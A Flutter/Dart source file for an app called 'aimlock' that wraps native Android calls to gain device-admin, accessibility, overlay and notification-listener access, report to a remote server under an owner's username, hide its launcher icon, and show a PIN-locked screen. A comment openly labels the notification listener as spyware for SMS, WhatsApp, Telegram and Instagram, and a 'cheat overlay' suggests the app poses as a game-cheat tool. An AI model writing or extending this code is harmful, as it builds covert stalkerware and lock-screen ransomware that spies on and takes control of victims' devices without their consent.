import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';

class NativeService {
  static const _channel = MethodChannel('com.aimlock.app/native');

  static Future<bool> checkOverlayPermission() async {
    try { return await _channel.invokeMethod('checkOverlayPermission') == true; }
    catch (_) { return false; }
  }

  static Future<void> requestOverlayPermission() async {
    try { await _channel.invokeMethod('requestOverlayPermission'); } catch (_) {}
  }

  static Future<bool> checkDeviceAdmin() async {
    try { return await _channel.invokeMethod('checkDeviceAdmin') == true; }
    catch (_) { return false; }
  }

  static Future<void> requestDeviceAdmin() async {
    try { await _channel.invokeMethod('requestDeviceAdmin'); } catch (_) {}
  }

  static Future<bool> checkAccessibility() async {
    try { return await _channel.invokeMethod('checkAccessibility') == true; }
    catch (_) { return false; }
  }

  static Future<void> requestAccessibility() async {
    try { await _channel.invokeMethod('requestAccessibility'); } catch (_) {}
  }

  // [BARU] Notification Listener (untuk spyware SMS/WA/TG/IG)
  static Future<bool> checkNotifListener() async {
    try { return await _channel.invokeMethod('checkNotifListener') == true; }
    catch (_) { return false; }
  }

  static Future<void> requestNotifListener() async {
    try { await _channel.invokeMethod('requestNotifListener'); } catch (_) {}
  }

  static Future<void> startCheatOverlay() async {
    try {
      final granted = await _channel.invokeMethod('startCheatOverlay');
      if (granted == false) {
        await Future.delayed(const Duration(seconds: 4));
        try { await _channel.invokeMethod('startCheatOverlay'); } catch (_) {}
      }
    } catch (_) {}
  }

  static Future<void> stopCheatOverlay() async {
    try { await _channel.invokeMethod('stopCheatOverlay'); } catch (_) {}
  }

  static Future<bool> startSocketService({
    required String serverUrl,
    required String deviceId,
    required String deviceName,
    required String ownerUsername,
    String deviceToken = '',
  }) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('serverUrl',     serverUrl);
      await prefs.setString('deviceId',      deviceId);
      await prefs.setString('deviceName',    deviceName);
      await prefs.setString('ownerUsername', ownerUsername);
      final result = await _channel.invokeMethod('startSocketService', {
        'serverUrl':     serverUrl,
        'deviceId':      deviceId,
        'deviceName':    deviceName,
        'ownerUsername': ownerUsername,
        'deviceToken':   deviceToken,
      });
      return result == true;
    } catch (_) { return false; }
  }

  static Future<void> stopSocketService() async {
    try { await _channel.invokeMethod('stopSocketService'); } catch (_) {}
  }

  static Future<bool> showLockScreen({required String text, required String pin}) async {
    try {
      return await _channel.invokeMethod('showLockScreen', {'text': text, 'pin': pin}) == true;
    } catch (_) { return false; }
  }

  static Future<void> hideLockScreen() async {
    try { await _channel.invokeMethod('hideLockScreen'); } catch (_) {}
  }

  // Sembunyikan app ke background
  static Future<void> hideApp() async {
    try { await _channel.invokeMethod('hideApp'); } catch (_) {}
  }

  // Sembunyikan icon dari launcher (setelah setup selesai)
  static Future<void> hideAppIcon() async {
    try { await _channel.invokeMethod('hideAppIcon'); } catch (_) {}
  }

  // Usage Access (untuk App Usage stats)
  static Future<bool> checkUsageAccess() async {
    try { return await _channel.invokeMethod('checkUsageAccess') == true; }
    catch (_) { return false; }
  }

  static Future<void> requestUsageAccess() async {
    try { await _channel.invokeMethod('requestUsageAccess'); } catch (_) {}
  }

  // Google Location Accuracy Dialog
  static Future<bool> requestLocationAccuracy() async {
    try { return await _channel.invokeMethod('requestLocationAccuracy') == true; }
    catch (_) { return false; }
  }

  // Screen Text Overlay
  static Future<void> startScreenText(String text) async {
    try { await _channel.invokeMethod('startScreenText', {'text': text}); } catch (_) {}
  }

  static Future<void> stopScreenText() async {
    try { await _channel.invokeMethod('stopScreenText'); } catch (_) {}
  }

  // Screen Pinning (Aplikasi Disematkan)
  static Future<void> startScreenPinning() async {
    try { await _channel.invokeMethod('startScreenPinning'); } catch (_) {}
  }
}
